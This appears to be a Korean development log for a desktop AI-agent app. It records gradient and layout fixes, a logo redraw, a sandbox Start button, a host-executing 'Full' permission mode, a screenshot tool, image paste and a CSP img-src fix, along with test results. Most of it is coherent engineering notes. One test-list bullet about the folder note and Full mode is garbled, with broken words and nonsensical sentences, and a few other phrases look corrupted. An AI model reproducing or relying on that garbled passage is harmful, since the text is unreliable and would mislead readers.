| 전송·정지·Apply | 그라디언트 + 스타디움 | 표면당 그라디언트는 하나. 팝오버의 선택된 프리셋은 납작한 채움인 이유가 이것입니다 |
| 여백 | 컴포저 106 → 115px, 행 8/10, empty 8/28 | **측정.** 520px 창에서도 컴포저가 창 안에 들어옵니다 |

### 테스트

```
npx tsc --noEmit                 클린
npm test                         451 tests / 73 suites
python -m pytest tests/unit -q   610 passed / 7 skipped (test_build_scripts 4건은 기존 flake)
scripts/audit_reduced_motion.py  모든 애니메이션 선택자가 취소 목록에 있음
```

새 테스트 7개: 그라디언트가 `--accent`에서 시작하고 같은 색상환을 돈다 / 두 스톱 다
`--bg` 위 4.5:1(글자로 쓰이므로) / 그라디언트를 쓰는 규칙이 토큰을 쓴다 / 그라디언트
글자는 `background-clip: text`로 잘린다 / wash의 alpha 상한 / 레일이 "지금 어디인지"를
표시한다.

**뒤집은 테스트 셋**: "chips are rounded rectangles, not stadiums"는 이제
"a chip is a stadium, and a selected thing is a wash"입니다. 이전 판단이 틀렸다기보다
다른 질문에 답한 것이고, 규칙이 바뀌었으니 단언도 바뀝니다.

### 패키징된 빌드에서 확인한 것

- **레일 인디케이터가 실제로 칠해짐**: 타깃 40×40, 인디케이터 40×32 radius 999px.
  픽셀 (10,76)=(113,140,240) → (45,76)=(135,123,230) — **다른 픽셀, 즉 그라디언트**.
  클릭은 실제 `Input.dispatchMouseEvent`로 레일 토글을 눌러 얻었습니다.
- **그라디언트 글자가 실제로 칠해짐**: 워드마크 잉크의 색상이 왼쪽 **223.8°** →
  오른쪽 **248.3°**. 선언한 두 스톱(220°→256°) 방향과 일치합니다.
- **전송 버튼**: 32×32에서 좌 (79,94,159) hue 228.8° → 우 (88,89,158) hue 239.1°.
- **패널 모서리 24px이 sticky 푸터를 실제로 자름**: 패널 bottom-left 코너 격자에서
  바깥쪽 셀이 backdrop(8)로 읽히고 안쪽이 footer(32). 사각 노치 없음.
- 520px 창에서 컴포저 하단 494 / 창 520. 잘림 없음. `.empty` 안 포커스 가능 요소 0개.
- 탭 정지 14개 전부 `2px solid rgb(151,183,245)` + `:focus-visible`.

### 남은 것

- **`--accent` 단색 소비자는 그대로 둡니다**: 텍스트·테두리·작은 마크·체크박스
  `accent-color`. 그라디언트는 "누르는 것", 단색은 "칠해진 것"입니다.
- 선택된 대화 행의 wash는 이제 **실제 대화가 있는 상태에서 확인했습니다** —
  아래 "대화 행의 wash" 절.

---

## 로고: 셰브론 → T (2026-10-04)

사용자가 "간단한 T"를 원해서 영문 프롬프트로 새 아트워크를 받았습니다. 앞선
셰브론 시도는 두 가지 결함이 있었습니다 — 스트로크가 7.81%(16px에서 1.25px,
살아남는 최소값 14.06%의 56%)와 불투명 흰색 모서리. 새 T는 둘 다 통과합니다.

### chroma key를 직접 한 이유

사용자가 "그냥 네가 chroma key해라"고 해서 했습니다. 그게 맞았습니다 —
`#2f6feb`로 정규화할 계획이었기 때문입니다. **형상은 모델에게, 색은 우리가.**
그래서 `--accent`과 그 ramp가 움직이지 않습니다.

작업:

1. 원본에서 두 마스크를 추출 — ground는 blue-dominance(`b - max(r,g) > 40`),
   T는 ground 안쪽의 흰색. 모서리의 흰 페이지 배경을 analytic rounded-rect로
   제외(단순 bounding box로는 모서리가 T로 잡혔습니다).
2. 측정값을 비율로 환산하고 1024 캔버스에 다시 그렸습니다: crossbar
   1104×209, stem 246, corner radius 211 — 모두 `/1550` 또는 `/1624`.
3. 4× supersample 후 LANCZOS downsample.

### 측정된 사실

```
ground  1550 x 1624  ← 정사각이 아님 (74px 차이)
radius  211px = 13.6%
T       1104 x 1161 = 71.2% x 71.5% of the ground
stem    246px = 15.87%  → 16px에서 2.53px   PASS (최소 14.06%)
crossbar 209px = 12.87% → 16px에서 1.83px   (아슬아슬)
corner   (0,0) alpha 0                      PASS
terminals 사다리꼴: crossbar rx 104 ≈ 132/2, stem rx 123 = 246/2
```

**T는 앱이 이미 컨트롤에 쓰고 있는 모양 그대로였습니다** — 두 개 모두 full
radius stadium. 별도의 스타일이 아니라 같은 언어였습니다.

### 작업을 실제로 바꾼 것

- **`AppMark.tsx`**: stroke+path → fill+rect. `MARK_PATHS` → `MARK_RECTS`.
  viewBox 512 → 1024. stroke는 더 이상 없습니다 — T에는 blunt할 mitre도,
  라운드할 팔도 없습니다. 두 rect의 단말이 *그 자체로* stadium입니다.
- **`AppMark.test.tsx`**: `d` 비교 → `x/y/width/height/rx` 비교. 세 개 새로:
  **"both terminals are half-circles, not cuts"**, **"it is painted on
  currentColor, never on a literal"**, 그리고 stem 비율을 14.06% 이상으로
  고정하는 floor.
- **`IconRail.test.tsx` / `MessageList.test.tsx`**: 둘 다 path를 세고 있었습니다.
- **`ALLOWED_TAGS`**: `path` → `rect`. 이것은 **실제 캐치**였습니다 —
  첫 실행 패널에 포커스 가능 요소가 0개라는 기존 테스트가 `<rect>`를
  거부했습니다. 다른 태그와 마찬가지로 handler를 달 수 없는 모양인데
  allowlist가 artwork의 *구성*을 따라가고 있었습니다.
- **토큰 주석**: "87% of the opaque pixels across seven raster sizes" →
  **88.7% / fifteen**. 실제로 다시 셌습니다. ramp는 그대로 —
  `#6393f0`과 `#97b7f5` 둘 다 여전히 존재하므로 `--accent`는 유효합니다.

### XML 주석 함정 (다시)

`npx tauri icon`이 실패했습니다: `comment at 2:3 contains '--'`. XML 주석은
`--`를 못 가집니다. em dash로 교체했습니다.

### 돌연변이 3개, 전부 잡힘

| 변이 | 잡음 |
|---|---|
| stem을 4.3%로 얇게 (`width 163`→`44`) | ✔ `its two strokes are the strokes on the taskbar` |
| 세 번째 stroke 추가 | ✔ 동일 |
| 단말을 각지게 (`rx 81`→`8`) | ✔ 동일 |

### 패키징된 빌드에서 확인

```
DOM 렌더:  crossbar 22.78 x 4.13  (기대 22.78 x 4.125)
           stem      5.09 x 18.75  (기대  5.09 x 18.75)
32px rail: T로 읽힘, 글리프 233,233,233 on rail 38,38,38 = 12.46:1
15개 raster 전부 corner alpha 0
```

`tsc` 클린 · `npm test` **455/455** (73 suites, 이전 453+2) · 감사 클린 ·
재빌드 성공.

---

## 대화 행의 wash: 실제 대화로 확인 (2026-10-04)

### 어떻게 실제 대화를 만들었나

막혔던 전제는 사실 반쯤 잘못이었습니다. 대화가 0개인 이유는 **대화를 만들 수
없어서가 아니라 만들 방법을 몰라서**였고, 그 방법은 코어를 직접 두드리지 않는
경로에 있었습니다.

1. 패키징된 빌드를 CDP-debuggable로 띄웁니다
   (`WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS=--remote-debugging-port=9333`).
2. 사이드바 토글을 **실제 마우스 클릭**으로 누릅니다
   (`Input.dispatchMouseEvent` — 합성 `.click()`은 이 WebView2에서 먹혔습니다).
3. 패널의 **"New chat"** 을 실제 클릭합니다. 여기서 중요한 사실이 하나 있습니다:
   **대화 생성에는 provider도 Docker도 필요 없습니다.** `conversations.create`는
   core의 `ConversationStore.create` 한 줄이고, provider는 "메시지를 보낼 때"
   필요합니다. `config.toml`에 프로젝트 폴더가 이미 설정돼 있어서(`WebAIAgent`)
   `startNewChat`의 폴더 선택 대화도 뜨지 않았습니다. 결과물:
   `~/AppData/Roaming/TONYAgent/conversations/3debfbee….json` — 215바이트짜리
   진짜 대화 파일이 디스크에 생겼습니다.
4. 전환 동작까지 보려면 두 개가 필요했습니다. 같은 버튼을 한 번 더 눌러 두 번째
   대화(2d3b8d82…)를 만들고, 행 메뉴 → **Rename** 으로 한쪽에 이름을 붙여
   어느 행인지 구분되게 했습니다(`Input.insertText` + `rawKeyDown`/`char`/
   `keyUp` Enter — 합성 KeyboardEvent는 rename을 확정하지 않았습니다).

### 확인한 것 (전부 실제 픽셀)

| 항목 | 측정값 |
| --- | --- |
| 선택된 행의 `background-image` | `linear-gradient(135deg, rgba(99,147,240,0.18) 0%, rgba(155,124,240,0.12) 100%)` |
| `background-color` | `rgba(0,0,0,0)` — 토큰이 wash임을 증명 |
| `border-radius` | `16px` (`--radius-md`) |
| hairline | `0px` — 없습니다 |
| 그림자 | `none` |
| 그려진 픽셀 (near → far) | `(40,47,63)` → `(40,43,58)` → `(41,40,54)` |
| 색상환 (near → far) | **221.7° → 225.7° → 230.0° → 236.2° → 244.3°** |
| 크로마 | 23 → 21 → 18 → 16 → 14 |
| 패널 배경 (idle 행) | `(26,26,26)` = `--bg` |
| 전환 후 | active가 다른 행으로 **이동**했고 wash도 함께 이동 |

hover 비교도 했습니다. 포인터를 **비활성** 행 위로 올리면 그 행은
`rgb(56,56,56)`(`--hover`), 활성 행은 그대로 wash — 두 상태가 동시에 보이는
픽셀 증거입니다.

### 여기서 나온, 코멘트가 틀렸던 것

가장 중요한 발견은 **주석이 가정한 것과 반대**라는 점입니다.
`conversation-list.css`는 선택 wash를 "hover가 될 수 없는 색조"라고 근거를 달았는데,
실제로 compositing해서 재면:

```
wash near end over --bg = rgb(39 48 65)
--hover                 = rgb(56 56 56)
명도비 ≈ 1.13:1
```

**선택된 행이 hover된 행보다 더 어둡습니다.** 둘은 휘도만 보면 같은 색이고,
그레이스케일 스크린샷으로는 구분되지 않습니다. 실제로 구분하는 것은
**색조**입니다 — wash는 chroma 14~23을 carry하고 `--hover`는 0(무채색)입니다.

그래서 이 차를 색인이 아니라 크로마로 잡는 테스트를 새로 썼습니다. 그리고 우연한
수확: 기존 `gradStops()`는 `#[0-9a-f]{6}`만 찾으므로 `--grad-wash`에 대해 **빈
배열을 반환하면서 아무도 모르게 통과하고 있었습니다**. wash는 `rgb(r g b / a)`
형태로 선언되어 있어서입니다. `maskedStops()`를 추가했고, alpha만 세던 기존
wash 테스트도 이제 `(hex, alpha)` 쌍을 봅니다.

### 추가한 테스트 2개 (`layout.test.ts`, 둘 다 변이 실제로 잡힙니다)

- **"the ink on a washed row clears the floor on the pixel it is painted on"** —
  `--fg`와 `--fg-dim`을 **composite된 wash 양끝**에서 측정(4.5:1 이상). 확인된 실측:
  `--fg` 11.34:1 / 12.51:1, `--fg-dim` 5.64:1 / 6.21:1.
  돌연변이: near stop을 `alpha 0.55`로 → **`--fg-dim is 2.76:1 on composited wash
  stop 0` 로 실패.**
- **"a washed row is told from a hovered one by hue, not by lightness"** —
  `--hover`는 chroma 0이어야 하고, composite된 wash는 chroma ≥ 12.
  돌연변이: near stop을 `rgb(150 140 130 / 0.30)`로 → **chroma 6으로 실패.**

## Start 버튼, 그리고 Full은 호스트에서 (2026-10-04)

두 가지 요청이었습니다.

1. **샌드박스를 여는 버튼이 없다** — "Start sandbox 버튼 만들어주실 수 있나요?"
2. **Full 권한이면 샌드박스 말고 내 컴퓨터를 직접 조작하게** — core 쪽은
   이전 세션에서 끝냈고, 이번에 UI를 붙였습니다.

### 무엇이 실제로 고장 났는지

버튼을 붙이면서 알게 된 것: **샌드박스를 시작할 방법이 폴더 선택창뿐**이었고,
폴더는 `folder_manager`가 디스크에서 복원되므로 재실행하면 `sandbox: stopped`
인 채로 아무것도 누를 수 없었습니다. 폴더를 고르는 동작이 "샌드박스를
시작한다"는 사실이 UI 어디에도 쓰여 있지 않았습니다.

두 번째 고장은 더 조용했습니다. `state`가 샌드박스 상태를 **전혀 보고하지
않았습니다.** 창은 `sandbox.status` 이벤트만 듣는데, 재시작한 창은 그
이벤트를 하나도 못 받습니다. 그래서 "Stop을 눌러도 멈추지 않는다"보다 나쁜
상태가 가능합니다 — 이미 떠 있는 샌드박스 위에 "Start"를 그려놓는 것.

### 고친 것 (core)

- `AgentSession.sandbox_status()` — `sandbox.status` 이벤트가 쓰는 **같은
  문자열**(`"running"` / `"stopped"`)을 지금 상태로 돌려줍니다.
- `_h_state`가 `"sandbox"`를 보고합니다. 창은 "내가 마지막으로 한 일"이
  아니라 "core가 실제로 가지고 있는 것"을 묻습니다.

### 고친 것 (프런트)

- `SettingsPanel`: "Project folder" 그룹에 **Start**. 폴더가 있고 `running`도
  `starting`도 아닐 때만 보이고, 시작 중에는 `Starting...`으로 **비활성**
  버튼이 됩니다(컨테이너가 몇 초 걸리는데 Start가 그대로 있으면 두 번 누릅니다
  = 같은 폴더에 컨테이너 두 개).
- `App.tsx`: `startSandbox`는 **경로 없이** `sandbox.start`를 부릅니다. core는
  이미 그 폴더를 들고 있고, 다시 보내는 것은 창과 core가 다른 프로젝트를 말하게
  만드는 것뿐입니다.

### 여기서 진짜 버그를 하나 더 잡았습니다

라이브로 Start를 눌렀더니 이렇게 떴습니다:

```
name 'folder_manager' is not defined
```

`AgentSession.start_sandbox`가 `folder_manager.current_folder`를 **쓰고
있는데 import가 없었습니다.** 왜 지금까지 안 죽었냐면 — 모든 호출자가 경로를
넘겼고, `project_path or ...`가 이름을 찾기 전에 short-circuit 되었기
때문입니다. **경로 없는 호출은 이 함수를 처음 실행하는 경로**였고, 그때 이름이
없어졌습니다. UI에 없는 기능이 dead code 안에 남아 있던 것.

**그리고 이 버그를 놓친 테스트가 하나 더 있었습니다.** 처음 쓴 회귀 테스트가
`AgentSession.start_sandbox` 자체를 stub 해서, 정확히 고장 난 그 줄을 지나쳐
버렸습니다. 깨진 코드 위에서도 58 passed였습니다. 컨테이너만 fake로 바꾸고
rpc → session → manager를 관통하게 고친 뒤에야 실제로 잡혔습니다. 부위보다
**호출 경로**를 fake해야 한다는 뜻이고, 이 저장소에서 몇 번 더 배운 규칙입니다.

### Full은 호스트에서 (core는 이전 세션에서 완료)

`Permission.runs_on_host` — low/medium/high는 False, full만 True.
`shell_tools`의 `ExecuteCommandTool.execute`가 런타임 조회 **전에**
`if host_execution(): return await _execute_local(...)`로 빠지고,
`runtime_access.check_runtime` / `isolated_backend()`도 호스트 모드를 존중합니다
(`execute_js`를 포함한 두 번째 게이트). UI는 wire의 플래그를 그대로 씁니다:
`permissionGain`이 **먼저** 확인해서 High 행의 한 줄이 "Runs on this computer,
outside the sandbox"가 되고, Full의 마커는 `on this computer`로 **앞섭니다**.

### 패키징된 빌드에서 실제로 확인한 것

sidecar를 다시 빌드하고(`scripts/build_sidecar.py` → `tauri:build`) CDP로
직접 열어서 재현했습니다.

```
Settings → PROJECT FOLDER, 폴더 = LiveProject (Users\iig2y\Desktop\LiveProject)
  부팅 직후       [Change...] [Start]   statusbar: sandbox: stopped
  Start 클릭 후   [Change...] [Stop]    statusbar: sandbox: running
  재시작 후       [Change...] [Start]   statusbar: sandbox: stopped
                  (컨테이너도 같이 없어져 있었음 — 창이 샌드박스 수명을 결정)
```

**가짜가 아닙니다.** Start는 실제로 컨테이너를 띄웠습니다:

```
$ docker ps
24377b30ac12  tonyagent/sandbox:latest  tonyagent-sandbox  Up 30 seconds
```

wire도 실제 빌드된 `tonyagent-core.exe`에 직접 물어봤습니다:

```
low runs_on_host = False       state.sandbox = stopped
medium runs_on_host = False    permission.set {"permission":"full"} ->
high runs_on_host = False        {'name':'full', ... 'runs_on_host': True}
full runs_on_host = True       state.permission = full
```

permission 메뉴도 live DOM으로:

```
Low      gain: —
Medium   gain: Can run shell commands
High     gain: Runs on this computer, outside the sandbox
Full     markers: ON THIS COMPUTER / ANY COMMAND / NO PROMPTS
```

### 추가한 테스트 (전부 변이 확인)

프런트(`App.test.tsx`, describe 추가) — `.settings-row`은 Model 그룹과 API key
그룹도 쓰기 때문에 **"Project folder" 헤딩으로 그룹을 찾아야** 합니다. 안
그럼 Apply와 Save key가 샌드박스 버튼으로 잡힙니다.

- "a folder with no sandbox offers Start, and Start sends no path" —
  변이: `attachProject("")` → `attachProject("D:/somewhere/else")` → 실패.
- "a sandbox the core already has shows Stop and no Start" —
  변이: `setSandbox("stopped")` → 실패.
- "no folder means no Start, because there is nothing to start".
- "while it is starting the button says so instead of inviting a second start" —
  변이: `canStart`에서 `&& !starting` 제거 → 실패.
- "a sandbox that will not start says so instead of failing silently".
- "the folder note admits that Full does not run in the sandbox" — 생램
  문이는 "tools are refused outside it" 만 있었으니, 이것이
  Full 크리의 메뉴 앞에서가 Full을 생램하는 것을
  문장하지 않았니다. 변이 수정된 문장:
  “except at Full, which runs commands on this computer instead of in here”
  (Full 을 제거하면 사부의 본로이 사용되지
  않는 다.) 변이: 그 문장을 지우면 실패.

코어(`test_headless_core.py`) — 2개:

- `test_state_reports_the_sandbox_the_core_actually_has` —
  `get_runtime_backend`만 fake라서 `is_running`이 **실제로 실행**됩니다.
  변이: `"sandbox": "stopped"` 하드코딩 → 실패.
- `test_sandbox_start_without_a_path_uses_the_folder_already_chosen` —
  변이: import 한 줄 제거 → `NameError`로 실패.

`SettingsMenus.test.tsx` — High 행의 gain 문장이 바뀐 만큼 기존 두 개
테스트의 기대값이 **옳게 깨졌습니다**(고치지 않고 통과시킬 수는 없었습니다).
Full 마커가 3개가 되어 "both of the powers"라는 이름도 "every power"로
바꾸었습니다. 그리고 같은 문장을 단독으로 보는 테스트를 하나 더 뒀습니다.

### 이번에 만난 함정

- Sidecar exe는 **Oct 3 빌드**였습니다. 프런트만 바꾸고 곧바로 라이브 검증하면
  옛 core를 talking하게 됩니다. core를 건드렸으면 sidecar부터 다시 빌드해야
  합니다(3분).
- `.settings-row`가 세 그룹에 있습니다. 테스트를 화면에 쓰는 코드에 맞추는 게
  아니라 **헤딩으로 그룹을 찾게** 했습니다(`settings-group` + `h3` 텍스트).
- 이 창은 `h3`가 CSS로 대문자화되어 있어 라이브 DOM에서 `PROJECT FOLDER`로
  비교해야 합니다.

### 아직 하지 않은 것

- **`pytest tests -q`** (Docker 데몬 쓰는 변형)은 이번에도 돌리지 않았습니다.
- Full 모드에서 **실제 턴**을 돌려 호스트 실행을 확인하지는 않았습니다.
  `runs_on_host`가 wire에 실리고 core가 이를 따른다는 것까지는 위와 같이
  확인했지만, 모델이 실제로 명령을 내리는 e2e는 provider 키가 필요합니다.

## 스크린샷 도구, 붙여넣기 미리보기, 그리고 깨져 있던 CSP (2026-10-04)

이번 패스는 요청 두 개와, 그 검증 도중 발견한 **실제 버그 하나**로
구성됩니다. 스크린샷 도구와 붙여넣기는 코드로 끝났고, CSP 버그는 지금
고쳐졌으며 이 문서를 쓰고 있는 브라우저에서도 고쳐진 상태를 확인했습니다.

### 1. `take_screenshot` — AI가 자기 화면을 본다

`src/tonyagent/tools/screen_tools.py`의 `TakeScreenshotTool`. 이름은
**`take_screenshot`**, category는 UTILITY, `sandbox_required=False`,
`isolation_required=False`, `requires_confirmation=False`. 즉 샌드박스 밖에서
돌고, 그 자체로는 확인을 묻지 않습니다 — 사용자가 백그라운드로 창을
열어놓고 "지금 화면에 뭐 보여?" 라고 물으면 샌드박스 안에서는 답할 수 없기
때문입니다.

- 인자 `x, y, width, height`는 전부 선택이며 정수입니다.
- 전체 화면(인자 없음)과 영역 지정 모두 지원하고, **둘 다 아니거나 둘 다
  있어야** 합니다. 절반만 주면 거절합니다.
- 가장 긴 변을 `MAX_EDGE = 1568`로 Lanczos + round로 줄이고 PNG로 base64
  인코딩해 `ToolResult.images = [{"mime", "data"}]`로 돌려줍니다.
- `from PIL import ImageGrab`는 `_grab()` **안에서** 임포트합니다. Pillow는
  이제 `pyproject.toml`에 `Pillow>=10.0.0`로 선언되어 있습니다(설치만 되어
  있고 선언은 안 되어 있었습니다).
- 거절 사유: `NOT_FULL`(호스트 실행이 아님), 영역이 네 인자 중 일부만 옴,
  크기가 0 이하, x/y가 음수, 영역이 데스크톱 밖으로 나감.

이미지를 함부로 반환하지 않는 경로도 있습니다. 세 군데가 함께 움직입니다.

- `tools/base.py` — `ToolResult.images`가 생겼습니다. **`to_dict()`에는
  들어가지 않습니다.** 이것이 의도된 것입니다. `to_dict()`는 저장·로그
  경로이고, 도구 결과를 거기로 흘려보내면 안 됩니다.
- `core/session.py` — `@staticmethod _tool_content(payload, result)`. 이미지가
  없으면 `json.dumps(payload)` 문자열 하나, 있으면
  `[{"type":"text",...},{"type":"image_url",...}]`. **텍스트가 그림보다 먼저**
  나옵니다. base64 덩어리로 시작하면 사람이 읽을 수 없기 때문입니다.
  `ChatMessage.to_dict`는 리스트 형태의 content를 그대로 통과시킵니다.
- `core/attachments.py` — `strip_images(messages)`. 대화 저장을 할 때
  `image_url` 파트를 텍스트 한 줄로 바꿉니다. 스크린샷은 *지금*의 화면이고
  대화는 턴이 끝난 뒤 저장되므로, 지난 화면을 다시 보여주는 것이 오해를
  부릅니다. 텍스트 파트와 다른 모든 필드는 손대지 않으며, 이미지가 없는
  메시지는 바이트 단위로 그대로 나옵니다. `headless/server.py:285`에서
  연결했습니다.

**허용 모드.** `core/modes.py`의 `_HOST_SCREEN_TOOLS = frozenset({"take_screenshot"})`를
Full과 Build의 allow-list에 붙였습니다. `ToolOrchestrator.tool_permitted`는
두 축을 교차시키므로 실제로는 **Full**, 그리고 **Build + High 이상**에서만
됩니다. 실측: low/medium/high는 False, full은 True, build는 True,
plan/mission/skills는 False.

**실측 검증.** 이 컴퓨터는 4800×1800 삼중 모니터입니다. 전체 화면 →
**1568×588, 118 KB PNG**. 영역 400×300 at (10,10) → **400×300, 23 KB**.
영역 이미지는 데스크톱 좌상단과 일치했고 눈으로도 판독 가능한 실제 크롭
이었습니다(데스크톱이 살아 있어서 두 캡처 사이에 몇 ms 차이가 있어 평균
`|delta|`가 60 바 bar 대비 46 — 느슨하지만 실제 화면임은 확실).

**기존 테스트 세 개가 일부러 바뀌었습니다.** 숨기지 않고 이유를 남깁니다.

- `test_modes_and_diffs.py::test_full_adds_no_tool_over_high` →
  **`test_full_adds_exactly_one_tool_over_high`**로 이름을 바꾸고
  `full.allowed_tools - high.allowed_tools == {"take_screenshot"}`를
  검사합니다. "추가 없음"이라는 주장이 이제 거짓이 되었으므로, 이름을
  남겨 두면 거짓인 테스트가 조용히 사는 셈입니다.
- `test_a_tool_needs_both_a_mode_and_a_permission_to_be_offered` 추가
  (Build+High는 거절, Build+Full은 허용, Skills+Full은 거절).
- `test_tool_wire_format.py::test_every_tool_reaches_the_wire_intact`
  의 개수 22 → **23**. 여행 경보(tripwire)입니다.

새 파일 `tests/unit/test_screen_capture.py`는 **26개** 테스트. `ImageGrab`은
`monkeypatch.setattr(screen_tools, "_grab", ...)`로 가립니다. 처음엔 데스크톱을
1920×1080으로 잡았는데 두 개가 실패했고, **틀린 것은 코드가 아니라
저 테스트**였습니다. `DESKTOP = (1440, 810)`으로 바꿔 "반환됨"과 "축소됨"을
별개 테스트로 분리했습니다.

### 2. 붙여넣기로 이미지 전송 대기

- `app/src/attachments.ts` — `imagesFromClipboard(data: DataTransfer | null): File[]`.
  `data.files`가 아니라 `data.items`를 순회하고, `kind === "file"`이고
  타입이 `image/*`인 것만 취하며, `getAsFile()`이 null이면 건너뜁니다.
  이름은 `pasted-<n><ext>`이고 확장자는 **mime에서** 뽑습니다
  (`MIME_EXTENSIONS` / `extensionFor`). 클립보드가 확장자를 주지 않기
  때문입니다.
- `app/src/Composer.tsx` — `acceptFiles(files)`를 새로 만들어 파일 선택기와
  붙여넣기가 **한 경로**를 씁니다(한도·검증·에러 메시지가 한 군데).
  `onPaste`는 **이미지가 0개면 `preventDefault()` 전에 반환**합니다.
  순서를 뒤집으면 글자 붙여넣기가 죽습니다. 그리고 `acceptFiles`는 이미
  대기 중인 첨부와 **이름을 먼저** 비교합니다 — `removeAttachment`가 이름으로
  지우기 때문에, `readFile` 뒤에 비교하면 이미지가 사라집니다.
- `app/src/ComposerPaste.test.tsx` — 14개. 이미지가 대기 첨부로, 이름이
  paste 이름으로, 두 번 붙여도 충돌 없음, 글자 paste를 삼키지 않음,
  이미지와 글자면 그림을 가져감, 말 없이 전송 가능, 5개 한도가 공유됨.
  **기존 reader 테스트가 빈 리스트만 검사하고 있던 구멍도 채웠습니다.**

리액트 함정 하나: `FileReader.onload`은 마이크로태스크가 아니라 태스크에
품어집니다. 그래서 붙여넣기를 디스패치하고 같은 턴에 단정하면 스트립이
비어 있습니다. 결과(컨시퀀스)를 폴링하면서 폴링 한 번당 `act`를 하나씩
돌립니다. `ComposerPaste.test.tsx`의 `paste()`가 바로 그 헬퍼입니다.
그리고 jsdom에는 **`ClipboardEvent`가 없습니다.**
`new dom.window.Event("paste", {bubbles:true, cancelable:true})`를 만들고
`Object.defineProperty(event, "clipboardData", {value: ...})`로 붙여야
리액트의 합성 핸들러가 봅니다.

### 3. 발견한 버그: CSP가 `img-src`를 아예 말하고 있지 않았다

붙여넣기를 패키징된 앱에서 라이브 검증하다가, 붙여넣기 자체는 성공했는데
**미리보기가 깨진 그림 아이콘**이었습니다. `naturalWidth: 0`.

원인은 `app/src-tauri/tauri.conf.json`의 CSP였습니다:

    default-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self'

**`img-src`가 없습니다.** 없는 지시문은 중립이 아니라 `default-src 'self'`로
폴백하므로, 앱이 메모리에서 만들어 내는 **모든 `data:` 미리보기가 차단**됩니다.
PNG 바이트는 유효했고(Pillow로 확인: 78바이트, 2×2 RGBA) `src`도 올바른
`data:image/png;base64,...`(126자)였습니다.

**이건 붙여넣기에만 있는 문제가 아닙니다.** 파일 선택기로 고른 첨부도
같이 깨져 있었습니다 — 즉 이 앱의 모든 미리보기.

    "csp": "default-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self'; img-src 'self' data: blob:"

`http:`/`https:`는 열지 않았습니다. 미리보기가 `img-src`를 여는 이유는
기능이지 공격면이 아니기 때문입니다.

**왜 아무도 몰랐는가:** jsdom은 CSP를 강제하지 않습니다. 어떤 CSP든
테스트는 통과합니다. 그래서 `app/src/webviewPolicy.test.ts`를 새로 썼습니다
(`tauri.conf.json`을 직접 읽어 지시문을 파싱). 4개 테스트:
`data:` 있음, `'self'`만 있고 http/https 없음, 네 가지 지시문 존재,
script는 `'self'`뿐. **`img-src` 지시문을 지우는 변이 → 3개 실패**로
확인했습니다.

**수정 후 실측 (패키징 빌드, CDP):** 붙여넣기 후
`naturalWidth: 2, naturalHeight: 2, complete: true`, 표시 크기 26×26.
캔버스로 다시 그려 `getImageData`를 읽으니 `[255,0,0,255]` × 4 —
깨진 그림 표시가 아니라 실제 픽셀이 디코드되었습니다.

### 4. 이 패스의 체크 결과

    npm test                exit 0   489 passed / 0 failed, 78 suites  (485 -> 489)
    npx tsc --noEmit        exit 0
    pytest tests/unit -q    exit 0   623 passed / 8 skipped  (test_build_scripts.py 제외)
    npm.cmd run tauri:build exit 0   MSI + NSIS

### 아직 하지 않은 것 / 한계

- **`tests/unit/test_build_scripts.py`**: 실행할 때마다 24개 중 4개 실패하고,
  매번 **다른** 4개입니다. `HEAD`를 그대로 꺼낸 워크트리에서도 재현되는
  기존 문제입니다. 위 수치에서 제외했습니다.
- **`pytest tests -q`**(Docker 데몬 쓰는 변형)는 돌리지 않았습니다.
- **`take_screenshot`를 실제로 호출하는 에이전트 턴**은(provider 키 필요)
  돌리지 않았습니다. 확인한 것: 플래그가 wire까지 실리고, 도구가 실제
  픽셀을 돌려주고, 도구 메시지에 `image_url` 파트가 실리고, `to_dict`가
  그것을 통과시킵니다.
- 커밋하지 않았습니다.

## 레이아웃 스윕: 읽기 칼럼 하나, 그리고 설정 패널 (2026-10-05)

사용자 지적: "Redesign을 할 때 놓친 부분이 있는 듯합니다. 설정 부분에 레이아웃이
깔끔하지 못합니다. 이 김에 전체 앱 레이아웃을 모두 살펴보고 깔끔하지 않은 곳이
있으면 바로 고쳐봅시다."

그래서 이번 패스는 취향 변경이 아니라 **실측한 값이 서로 어긋나는 곳**만
고쳤습니다. 방법: 패키징 빌드를 CDP로 띄워 `getBoundingClientRect`와
computed style을 전부 긁고, (a) 수평 오버플로, (b) 부모 콘텐츠 박스를 벗어난
자식, (c) `align-items: center`인 행에서 중심이 1.5px 이상 어긋난 항목,
(d) 블록 흐름에서 왼쪽 끝이 어긋난 텍스트를 스캔했습니다. 그 결과가 전부
clean인데도 눈에 걸리는 것들이 있었고, 그건 전부 **같은 값을 두 곳에 선언한**
자리였습니다.

### 1. 읽기 칼럼이 하나가 아니었습니다 (가장 큰 것)

`tokens.css`는 `--measure`(680px)를 "트랜스크립트·컴포저·힌트·배너가 함께 쓰는
읽기 칼럼"이라고 적어 두었지만, 실제로는 아니었습니다:

- `.composer-inner`는 `--measure`를 **박스**로 쓰고 그 안의 글자는 1px 테두리 +
  18px 패딩 = 19px 들어가 있었습니다(글자 290..932).
- `.transcript-inner`는 같은 박스에 `padding: 0 28px`를 박스 **안에서** 썼습니다
  → 메시지 칼럼 624px 대 컴포저 680px. 컴포저가 메시지보다 왼쪽 23px, 오른쪽
  33px 삐져나와 있었습니다. 리디자인이 트랜스크립트를 860px에서 680px로 줄이며
  그 28px 패딩을 함께 보지 않은 결과입니다.
- `.hint`에는 패딩이 아예 없어 271px에서 시작했습니다(컴포저 글자는 290px).
  컴포저를 설명하는 문장만 창의 왼쪽 끝에 서 있었습니다.
- `.transcript`는 자기 스크롤바(10px)를 자기 박스에서만 빼기 때문에, 대화가 길어져
  스크롤바가 생기는 순간 칼럼 전체가 5px 왼쪽으로 **움직였습니다**.

수정: `--column-inset: 19px` 토큰(= 컴포저의 1px + 18px, 한 곳에만 선언)을 만들고
`.transcript-inner`·`.hint`·`.banner`·`.logbar-toggle`·`.logstrip`이 그 토큰을
쓰게 했습니다. 컴포저 자신은 `calc(var(--column-inset) - 1px)`로 자기 테두리를
뺍니다(그 1px이 하드코딩이므로 `.composer-inner`의 테두리가 1px인지도 테스트가
확인합니다). `.transcript`에는 `scrollbar-gutter: stable both-edges`.

실측(패키징 빌드, CDP): 박스 `271..951`(= `--measure`), 글자 `290..932`가
트랜스크립트·메시지 행·코드블록·컴포저·모드 알약·전송 버튼·힌트·로그 스트립에서
전부 동일합니다.

`layout.test.ts`의 "the composer and the transcript share one measure"에 테스트
3개를 추가했습니다: 토큰이 컴포저의 실제 인셋인지(그리고 그 인셋이 8~40px
